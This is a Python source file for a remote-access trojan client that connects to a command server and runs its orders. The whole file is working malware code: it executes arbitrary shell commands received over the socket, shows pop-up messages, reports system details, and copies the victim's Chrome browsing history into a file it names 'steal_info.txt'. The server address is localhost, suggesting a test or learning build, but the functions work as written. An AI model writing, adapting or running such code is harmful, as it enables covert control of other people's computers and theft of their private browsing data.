# This script is developed by Yadex

import socket
import ctypes
import os
import platform
import sqlite3
from shutil import copyfile

def show_message_box(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Message from Server", 0x30 | 0x0)

def get_pc_info():
    try:
        pc_info = {
            "OS": platform.system(),
            "Version": platform.version(),
            "Release": platform.release(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname())
        }
        return "\n".join([f"{key}: {value}" for key, value in pc_info.items()])
    except Exception as e:
        return f"Error retrieving PC info: {e}"

def get_chrome_history():
    try:
        user_profile = os.environ['USERPROFILE']
        history_path = os.path.join(user_profile, r'AppData\Local\Google\Chrome\User Data\Default\History')

        if not os.path.exists(history_path):
            return f"Chrome history file not found at: {history_path}"

        temp_history = "temp_history"
        copyfile(history_path, temp_history)

        if not os.path.exists(temp_history):
            return f"Failed to copy Chrome history to: {temp_history}"

        conn = sqlite3.connect(temp_history)
        cursor = conn.cursor()

        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
        rows = cursor.fetchall()

        if not rows:
            return "No browsing history found."

        with open("steal_info.txt", "w", encoding="utf-8") as file:
            file.write("Chrome Browsing History:\n")
            for row in rows:
                file.write(f"URL: {row[0]}, Title: {row[1]}, Visits: {row[2]}, Last Visit Time: {row[3]}\n")

        conn.close()
        os.remove(temp_history)

        return "Browser info saved to steal_info.txt."

    except Exception as e:
        return f"Error retrieving Chrome history: {e}"

def steal_browser_info():
    try:
        chrome_history = get_chrome_history()

        return chrome_history
    except Exception as e:
        return f"Error stealing browser info: {e}"

def connect_to_server():
    server_ip = '127.0.0.1'  
    server_port = 9999  

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.connect((server_ip, server_port))
        print("Connected to the server.")

        while True:
            os.system('cls' if os.name == 'nt' else 'clear')

            command = client_socket.recv(1024).decode("utf-8")
            print(f"Received command: {command}")

            if command.startswith("message"):
                message = command.split(" ", 1)[1]
                show_message_box(message)  
                client_socket.send(f"Message displayed: {message}".encode())

            elif command.startswith("run"):
                command_to_run = command.split(" ", 1)[1]
                try:
                    response = os.popen(command_to_run).read()
                    client_socket.send(response.encode() if response else b"Command executed successfully.")
                except Exception as e:
                    client_socket.send(f"Error executing command: {e}".encode())

            elif command == "pcinfo":
                pc_info = get_pc_info()
                client_socket.send(pc_info.encode())

            elif command == "stealinfo":
                browser_info = steal_browser_info()
                client_socket.send(browser_info.encode())

            elif command == "exit":
                print("Disconnecting...")
                break

            else:
                client_socket.send("Unknown command received.".encode())

            input("\nPress Enter to continue...")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    connect_to_server()
